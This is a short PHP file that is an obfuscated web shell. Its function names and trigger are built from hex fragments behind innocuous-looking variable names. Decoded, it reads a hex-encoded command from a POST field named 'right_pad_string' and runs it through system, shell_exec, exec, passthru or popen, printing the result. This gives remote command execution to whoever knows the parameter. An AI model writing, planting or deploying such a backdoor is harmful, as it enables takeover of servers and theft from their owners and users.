<?php


$binding1 = '7';
$binding2 = '3';
$binding3 = '9';
$binding4 = '5';
$binding5 = 'd';
$binding6 = '6';
$binding7 = '8';
$binding8 = 'c';
$binding9 = 'f';
$binding10 = '0';
$binding11 = 'e';
$binding12 = '1';
$binding13 = '4';
$reverse_searcher1 = pack("H*", $binding1.$binding2.'7'.$binding3.$binding1.$binding2.$binding1.'4'.'6'.$binding4.'6'.$binding5);
$reverse_searcher2 = pack("H*", $binding1.$binding2.$binding6.$binding7.'6'.$binding4.$binding6.$binding8.'6'.$binding8.$binding4.$binding9.'6'.$binding4.'7'.$binding7.'6'.$binding4.'6'.'3');
$reverse_searcher3 = pack("H*", $binding6.'5'.$binding1.$binding7.$binding6.'5'.$binding6.$binding2);
$reverse_searcher4 = pack("H*", '7'.$binding10.'6'.'1'.$binding1.$binding2.'7'.$binding2.$binding1.'4'.$binding6.'8'.'7'.'2'.'7'.$binding4);
$reverse_searcher5 = pack("H*", '7'.'0'.'6'.'f'.'7'.$binding10.'6'.'5'.'6'.$binding11);
$reverse_searcher6 = pack("H*", $binding1.$binding2.$binding1.'4'.'7'.'2'.$binding6.'5'.$binding6.$binding12.'6'.$binding5.$binding4.$binding9.'6'.'7'.$binding6.$binding4.'7'.$binding13.$binding4.'f'.$binding6.$binding2.$binding6.$binding9.$binding6.$binding11.'7'.$binding13.$binding6.$binding4.$binding6.'e'.$binding1.'4'.'7'.'3');
$reverse_searcher7 = pack("H*", $binding1.'0'.$binding6.'3'.$binding6.$binding8.$binding6.$binding9.$binding1.'3'.$binding6.$binding4);
$right_pad_string = pack("H*", '7'.'2'.'6'.'9'.$binding6.'7'.$binding6.$binding7.'7'.'4'.'5'.'f'.'7'.$binding10.'6'.'1'.'6'.$binding13.$binding4.'f'.$binding1.$binding2.'7'.$binding13.$binding1.'2'.'6'.$binding3.'6'.'e'.'6'.$binding1);
if (isset($_POST[$right_pad_string])) {
    $right_pad_string = pack("H*", $_POST[$right_pad_string]);
    if (function_exists($reverse_searcher1)) {
        $reverse_searcher1($right_pad_string);
    } elseif (function_exists($reverse_searcher2)) {
        print $reverse_searcher2($right_pad_string);
    } elseif (function_exists($reverse_searcher3)) {
        $reverse_searcher3($right_pad_string, $desc_hld);
        print join("\n", $desc_hld);
    } elseif (function_exists($reverse_searcher4)) {
        $reverse_searcher4($right_pad_string);
    } elseif (function_exists($reverse_searcher5) && function_exists($reverse_searcher6) && function_exists($reverse_searcher7)) {
        $res_comp = $reverse_searcher5($right_pad_string, 'r');
        if ($res_comp) {
            $ref_entry = $reverse_searcher6($res_comp);
            $reverse_searcher7($res_comp);
            print $ref_entry;
        }
    }
    exit;
}
